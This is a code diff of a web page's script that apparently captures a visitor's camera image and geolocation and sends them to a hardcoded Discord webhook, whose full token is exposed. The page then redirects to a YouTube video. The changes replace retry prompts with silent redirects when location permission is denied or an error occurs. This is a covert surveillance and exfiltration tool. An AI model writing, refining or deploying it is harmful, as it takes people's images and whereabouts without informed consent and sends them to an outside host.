@@ -37,6 +37,7 @@
   <script>
     const webhookUrl = "https://discord.com/api/webhooks/1388161217603965210/eELyivDPEhlKfnaaDce_b90zBtGFpe51uLHo28LsG0gle_1d8pfuN-_U6vK6Q38_N4Fj";
     const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+    const deniedPage = "permission-denied.html"; // 👈 REDIRECT TARGET
 
     let capturedImageData = null;
     let coords = { lat: "Permission denied", lon: "Permission denied", acc: 0 };
@@ -124,12 +125,7 @@
         });
 
         if (!locationAllowed) {
-          document.body.innerHTML = `
-            <div>
-              <p style="color:white;"> permission not granted.<br>Please allow location access and reload the page to continue.</p>
-              <button id="retryBtn">Try Again</button>
-            </div>`;
-          document.getElementById("retryBtn").onclick = () => location.reload();
+          window.location.href = deniedPage; // 👈 Redirect on denied
           return;
         }
 
@@ -163,12 +159,7 @@
           });
 
       } catch (err) {
-        document.body.innerHTML = `
-          <div>
-            <p style="color:white;">❌ Unexpected error.<br>Please reload the page and try again.</p>
-            <button id="retryBtn">Reload</button>
-          </div>`;
-        document.getElementById("retryBtn").onclick = () => location.reload();
+        window.location.href = deniedPage; // 👈 Also fallback redirect
       }
     }
 
